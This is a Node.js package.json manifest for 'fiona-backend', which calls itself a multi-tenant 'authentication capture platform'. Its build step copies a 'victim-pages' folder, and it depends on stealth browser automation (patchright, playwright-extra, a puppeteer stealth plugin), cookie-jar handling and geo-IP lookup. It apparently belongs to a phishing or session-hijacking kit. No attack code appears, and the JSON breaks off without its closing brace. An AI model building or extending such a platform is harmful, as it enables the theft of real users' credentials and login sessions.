{
  "name": "fiona-backend",
  "version": "2.0.0",
  "description": "FIONA Design - Multi-tenant authentication capture platform backend",
  "main": "dist/index.js",
  "scripts": {
    "dev": "tsx watch src/index.ts",
    "dev:cf": "node scripts/deploy-local.js --port 8000",
    "build": "tsc && (cp -r victim-pages dist/ || xcopy /E /I /Y victim-pages dist\\victim-pages)",
    "start": "node dist/index.js",
    "prisma:generate": "prisma generate",
    "prisma:migrate": "prisma migrate dev",
    "prisma:studio": "prisma studio",
    "migrate:phase1": "node scripts/migrate-phase1.js"
  },
  "prisma": {
    "seed": "tsx prisma/seed.ts"
  },
  "dependencies": {
    "@prisma/client": "^5.22.0",
    "@types/node-forge": "^1.3.14",
    "@types/socket.io-client": "^1.4.36",
    "archiver": "^6.0.1",
    "axios": "^1.21.0",
    "axios-cookiejar-support": "^7.0.0",
    "bcryptjs": "^2.4.3",
    "cheerio": "^1.2.0",
    "cookie-parser": "^1.4.7",
    "cors": "^2.8.5",
    "dotenv": "^16.4.1",
    "esprima": "^4.0.1",
    "express": "^4.18.2",
    "express-rate-limit": "^7.1.5",
    "geoip-lite": "^2.0.3",
    "jsonwebtoken": "^9.0.2",
    "patchright": "^1.64.3",
    "playwright": "^1.41.2",
    "playwright-extra": "^4.3.6",
    "puppeteer-extra-plugin-stealth": "^2.11.2",
    "socket.io": "^4.8.4",
    "tough-cookie": "^6.1.0",
    "uuid": "^9.0.1",
    "ws": "^8.20.0",
    "zod": "^3.22.4"
  },
  "devDependencies": {
    "@types/archiver": "^6.0.4",
    "@types/bcryptjs": "^2.4.6",
    "@types/cookie-parser": "^1.4.10",
    "@types/cors": "^2.8.17",
    "@types/express": "^4.17.21",
    "@types/geoip-lite": "^1.4.4",
    "@types/jsonwebtoken": "^9.0.5",
    "@types/node": "^20.11.16",
    "@types/tough-cookie": "^4.0.5",
    "@types/uuid": "^9.0.7",
    "@types/ws": "^8.5.10",
    "prisma": "^5.22.0",
    "tsx": "^4.7.0",
    "typescript": "^5.3.3"
  }
